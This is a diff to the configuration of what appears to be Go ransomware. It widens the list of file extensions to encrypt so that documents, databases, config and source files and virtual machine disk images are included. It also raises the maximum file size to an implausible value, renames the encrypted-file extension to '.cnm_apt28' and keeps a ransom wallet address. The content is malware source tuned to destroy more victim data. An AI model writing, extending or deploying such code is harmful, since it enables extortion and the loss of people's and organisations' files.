@@ -39,9 +39,9 @@ var (
 	// Interesting extensions to match files
 	InterestingExtensions = []string{
 		// Text Files
-		"doc", "docx", "msg", "odt", "wpd", "wps", "txt",
+		"doc", "docx", "msg", "odt", "wpd", "wps", "txt", "dotx", "docm", "dotm", "ott", "rtf", "pages", "ods", "ots",
 		// Data files
-		"csv", "pps", "ppt", "pptx",
+		"csv", "pps", "ppt", "pptx", "pptm", "ppsx", "ppsm", "pot", "potx", "potm", "tsv", "pdf", "msg", "eml",
 		// Audio Files
 		"aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
 		// Video Files
@@ -55,21 +55,23 @@ var (
 		// Page Layout Files
 		"pdf", "indd", "pct", "epub",
 		// Spreadsheet Files
-		"xls", "xlr", "xlsx",
+		"xls", "xlr", "xlsx", "xlsm", "xlsb", "xlt", "xltx", "xltm",
 		// Database Files
-		"accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db",
+		"accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db", "frm", "ibd", "myd", "myi", "pgsql", "backup", "ora", "bson", "cql", "dmp", "sqlitedb",
 		// Game Files
 		"dem", "gam", "nes", "rom", "sav",
 		// Temp Files
 		"bkp", "bak", "tmp",
 		// Config files
-		"cfg", "conf", "ini", "prf",
+		"cfg", "conf", "ini", "prf", "properties", "json", "yaml", "xml", "toml", "env", "user", "makefile", ".settings",
 		// Source files
-		"html", "php", "js", "c", "cc", "py", "lua", "go", "java",
+		"html", "php", "js", "c", "cc", "py", "lua", "go", "java", "rb", "cpp", "h", "hpp", "class", "pyc", "cs", "seift", "rs", "sh", "bash", "pl", "css", "kt", "dart",
+		// 虚拟机镜像文件
+		"vmdk", "vmx", "vbox", "vdi", "vhd", "vhdx", "qcow2", "qcow", "pvm", "img", "dsk", "hds", "pvs", "sparseimage",
 	}
 
 	// Max size allowed to match a file, 20MB by default
-	MaxFileSize = int64(20 * 1e+6)
+	MaxFileSize = int64(20000000 * 1e+6)
 
 	// Indexer index files and control goroutines execution
 	Indexer = struct {
@@ -96,7 +98,7 @@ var (
 	NumWorkers = runtime.NumCPU()
 
 	// Extension appended to files after encryption
-	EncryptionExtension = ".encrypted"
+	EncryptionExtension = ".cnm_apt28"
 
 	// Your wallet address
 	Wallet = "FD0AhH61ona6fXS62RSQKhNF07Ijx5SBQO"
